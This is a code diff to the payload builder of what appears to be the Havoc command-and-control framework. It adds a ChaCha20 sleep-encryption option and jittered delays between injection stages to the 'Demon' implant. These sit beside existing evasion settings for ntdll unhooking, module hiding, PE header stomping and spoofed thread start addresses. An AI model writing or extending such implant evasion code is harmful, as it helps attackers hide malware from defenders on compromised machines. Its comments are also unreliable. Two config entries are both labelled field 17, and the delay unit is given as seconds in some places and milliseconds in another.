@@ -143,8 +143,8 @@ type Builder struct {
 	outputPath string
 	preBytes   []byte
 
-	// demonProfile holds address-resolution config read directly from the teamserver profile
-	// for fields that are not surfaced in the client payload UI (SleepObfStartAddr, InjectSpoofAddr).
+	// demonProfile holds config read directly from the teamserver profile
+	// for fields that need profile-based defaults (SleepObfStartAddr, InjectSpoofAddr, ExecDelay).
 	demonProfile struct {
 		SleepObfLib       string
 		SleepObfFunc      string
@@ -152,6 +152,8 @@ type Builder struct {
 		InjectSpoofLib    string
 		InjectSpoofFunc   string
 		InjectSpoofOffset int
+		ExecDelay         int /* HVC-046: base delay seconds between injection stages */
+		ExecDelayJitter   int /* HVC-046: jitter % applied to ExecDelay */
 	}
 
 	// [HVC-005 2026-03-28] BCRYPT_RSAPUBLIC_BLOB embedded as SERVER_PUBKEY_BLOB.
@@ -726,6 +728,9 @@ func (b *Builder) SetDemonProfileDefaults(demon *profile.Demon) {
 		b.demonProfile.InjectSpoofFunc = demon.InjectSpoofAddr.Function
 		b.demonProfile.InjectSpoofOffset = demon.InjectSpoofAddr.Offset
 	}
+	/* HVC-046: store profile ExecDelay defaults for use when the UI value is absent */
+	b.demonProfile.ExecDelay = demon.ExecDelay
+	b.demonProfile.ExecDelayJitter = demon.ExecDelayJitter
 }
 
 func (b *Builder) SetFormat(Format int) {
@@ -832,10 +837,13 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		ConfigRandGadget        = win32.FALSE /* random gadget per sleep cycle — HVC-030 Sub-3 */
 		ConfigUnhookNtdll       = win32.FALSE /* overwrite ntdll .text with clean KnownDlls copy — HVC-031 Sub-4 */
 		ConfigHideModules       = win32.FALSE /* unlink loaded modules from PEB LDR lists — HVC-031 Sub-2 */
-		ConfigPeStomp           = win32.FALSE /* stomp PE header during default sleep — ISS-037; off by default */
+		ConfigPeStomp           = win32.FALSE /* stomp PE header during default sleep - ISS-037; off by default */
+		ConfigSleepCipher       = 0           /* SLEEP_CIPHER_RC4=0 (default), SLEEP_CIPHER_CHACHA20=1 - HVC-045 */
 		ConfigVerbose           = win32.FALSE /* enable verbose debug output in demon */
 		ConfigCoffeeVeh         = win32.FALSE /* enable VEH for BOF object file loading */
 		ConfigCoffeeThreaded    = win32.FALSE /* enable threaded object file execution */
+		ConfigExecDelay         = 0           /* HVC-046: base delay seconds between injection stages; 0 = disabled */
+		ConfigExecDelayJitter   = 0           /* HVC-046: jitter % applied to ExecDelay; 0 = no jitter */
 		ConfigSleepObfLib       = ""          /* custom sleep-obf thread start address library (empty = default) */
 		ConfigSleepObfFunc      = ""          /* function name */
 		ConfigSleepObfOffset    = 0           /* byte offset */
@@ -1025,14 +1033,14 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			case "jmp rax":
 				ConfigObfBypass = SLEEPOBF_BYPASS_JMPRAX
 				if !b.silent {
-					b.SendConsoleMessage("Info", "Sleep Jump Gadget: \"jmp rax\"")
+					b.SendConsoleMessage("Info", "Sleep Jump Gadget: jmp rax")
 				}
 				break
 
 			case "jmp rbx":
 				ConfigObfBypass = SLEEPOBF_BYPASS_JMPRBX
 				if !b.silent {
-					b.SendConsoleMessage("Info", "Sleep Jump Gadget: \"jmp rbx\"")
+					b.SendConsoleMessage("Info", "Sleep Jump Gadget: jmp rbx")
 				}
 				break
 
@@ -1176,7 +1184,23 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		}
 	}
 
-	/* Verbose — enable verbose debug logging in Demon */
+	/* SleepCipher — RC4 (0) or ChaCha20 (1); default RC4 if not set (HVC-045) */
+	if val, ok := b.config.Config["Sleep Cipher"].(string); ok {
+		switch val {
+		case "ChaCha20":
+			ConfigSleepCipher = 1
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Sleep Cipher: ChaCha20")
+			}
+		default:
+			ConfigSleepCipher = 0
+			if !b.silent {
+				b.SendConsoleMessage("Info", "Sleep Cipher: RC4")
+			}
+		}
+	}
+
+	/* Verbose - enable verbose debug logging in Demon */
 	if val, ok := b.config.Config["Verbose"].(bool); ok {
 		if val {
 			ConfigVerbose = win32.TRUE
@@ -1204,6 +1228,30 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 				b.SendConsoleMessage("Info", "Coffee Threaded: Enabled")
 			}
 		}
+	}
+
+	/* ExecDelay — base delay seconds between injection stages (HVC-046) */
+	if val, ok := b.config.Config["Exec Delay"].(string); ok {
+		if n, err2 := strconv.Atoi(val); err2 == nil && n >= 0 {
+			ConfigExecDelay = n
+			if !b.silent {
+				b.SendConsoleMessage("Info", fmt.Sprintf("Exec Delay: %ds", n))
+			}
+		}
+	} else if b.demonProfile.ExecDelay > 0 {
+		ConfigExecDelay = b.demonProfile.ExecDelay
+	}
+
+	/* ExecDelayJitter — jitter % applied to ExecDelay (HVC-046) */
+	if val, ok := b.config.Config["Exec Delay Jitter"].(string); ok {
+		if n, err2 := strconv.Atoi(val); err2 == nil && n >= 0 && n <= 100 {
+			ConfigExecDelayJitter = n
+			if !b.silent {
+				b.SendConsoleMessage("Info", fmt.Sprintf("Exec Delay Jitter: %d%%", n))
+			}
+		}
+	} else if b.demonProfile.ExecDelayJitter > 0 {
+		ConfigExecDelayJitter = b.demonProfile.ExecDelayJitter
 	}
 
 	/* Apply profile-based address resolution fields */
@@ -1235,7 +1283,8 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 	DemonConfig.AddInt(ConfigUnhookNtdll)
 	DemonConfig.AddInt(ConfigHideModules)
 	DemonConfig.AddInt(ConfigPeStomp)            /* field 15 */
-	DemonConfig.AddInt(ConfigVerbose)            /* field 16 */
+	DemonConfig.AddInt(ConfigSleepCipher)        /* field 16: SLEEP_CIPHER_RC4=0, SLEEP_CIPHER_CHACHA20=1 */
+	DemonConfig.AddInt(ConfigVerbose)            /* field 17 */
 	DemonConfig.AddInt(ConfigCoffeeVeh)          /* field 17 */
 	DemonConfig.AddInt(ConfigCoffeeThreaded)     /* field 18 */
 	DemonConfig.AddString(ConfigSleepObfLib)     /* field 19: empty = default RtlUserThreadStart */
@@ -1244,6 +1293,8 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 	DemonConfig.AddString(ConfigInjectSpoofLib)  /* field 22: empty = no spoof addr */
 	DemonConfig.AddString(ConfigInjectSpoofFunc) /* field 23 */
 	DemonConfig.AddInt(ConfigInjectSpoofOffset)  /* field 24 */
+	DemonConfig.AddInt(ConfigExecDelay)          /* field 25: HVC-046 base delay ms between injection stages */
+	DemonConfig.AddInt(ConfigExecDelayJitter)    /* field 26: HVC-046 jitter % applied to ExecDelay */
 
 	// Listener Config
 	switch b.config.ListenerType {
